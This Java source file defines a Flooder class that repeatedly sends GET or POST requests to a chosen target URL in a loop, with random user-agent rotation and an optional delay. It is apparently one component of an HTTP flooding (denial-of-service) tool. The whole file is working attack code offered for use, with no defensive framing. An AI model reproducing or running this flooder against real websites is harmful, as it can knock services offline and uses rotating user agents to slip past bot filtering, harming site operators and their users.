/*
 * Created by: Felipe Rodrigues
 * http://www.tupinikimtecnologia.com.br
 */
package br.com.tupinikimtecnologia.http;

import br.com.tupinikimtecnologia.constants.GeralConstants;
import br.com.tupinikimtecnologia.utils.Utils;
import com.github.javafaker.Faker;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

/**
 * Created by felipe on 14/08/15.
 */
public class Flooder implements Runnable {

    private String targetUrl;
    private String userAgent;
    private int method;
    private boolean randomAgent;
    private String postData;
    private boolean randomData = false;
    private int delay;
    private int lastResponseCode;
    private boolean running = true;
    private HttpURLConnection con;

    public Flooder(){}

    public Flooder(String targetUrl) {
        this.targetUrl = targetUrl.trim();
        this.method = 0;
    }

    public Flooder(String targetUrl, String postData) {
        this.targetUrl = targetUrl.trim();
        this.postData = postData;
        this.method = 1;
    }

    @Override
    public void run() {
        while(running){
            try {
                if(method==0){
                    if(delay!=0){
                        Thread.sleep(delay*1000);
                    }
                    sendGet();
                }else if(method==1){
                    sendPost();
                }

            } catch (Exception e) {
                e.printStackTrace();
                this.running = false;
            }
        }
    }

    private void sendPost() throws Exception {

        if(isRandomAgent()){
            this.userAgent = Utils.randomUserAgent();
        }
        if(isRandomData()){
            Faker randData = new Faker();
        }

        URL obj = new URL(targetUrl);
        con = (HttpURLConnection) obj.openConnection();

        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", userAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
        con.setDoOutput(true);

        DataOutputStream wr = new DataOutputStream(con.getOutputStream());

        String urlParameters = this.postData;
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();

        this.lastResponseCode = con.getResponseCode();
        if(GeralConstants.Debug.HTTP_REQUEST_SHOW){
            System.out.println("\nPOST URL: " + targetUrl);
            System.out.println("Post: " + urlParameters);
            System.out.println("Response Code: " + this.lastResponseCode);
            System.out.println("Agent: "+this.userAgent);
        }

    }

    private void sendGet() throws Exception {

        if(isRandomAgent()){
            this.userAgent = Utils.randomUserAgent();
        }

        URL obj = new URL(this.getTargetUrl());
        con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", this.userAgent);

        this.lastResponseCode = con.getResponseCode();
        if(GeralConstants.Debug.HTTP_REQUEST_SHOW){
            System.out.println("\nGET URL: " + this.getTargetUrl());
            System.out.println("Response Code: " + this.lastResponseCode);
            System.out.println("Agent: "+this.userAgent);
        }

    }

    public void stop(){
        this.running = false;
    }

    public void setTargetUrl(String targetUrl) {
        this.targetUrl = targetUrl;
    }

    public String getTargetUrl() {
        return targetUrl;
    }

    public void setUserAgent(String userAgent) {
        this.userAgent = userAgent;
    }

    public String getUserAgent() {
        return userAgent;
    }

    public void setMethod(int method) {
        this.method = method;
    }

    public int getMethod() {
        return method;
    }

    public void setRandomAgent(boolean randomAgent) {
        this.randomAgent = randomAgent;
    }

    public boolean isRandomAgent() {
        return randomAgent;
    }

    public void setPostData(String postData) {
        this.postData = postData;
    }

    public String getPostData() {
        return postData;
    }

    public void setRandomData(boolean randomData) {
        this.randomData = randomData;
    }

    public boolean isRandomData() {
        return randomData;
    }

    public void setDelay(int delay) {
        this.delay = delay;
    }

    public int getDelay() {
        return delay;
    }

    public void setLastResponseCode(int lastResponseCode) {
        this.lastResponseCode = lastResponseCode;
    }

    public int getLastResponseCode() {
        return lastResponseCode;
    }

    public void setRunning(boolean started) {
        this.running = started;
    }

    public boolean isRunning() {
        return running;
    }

}
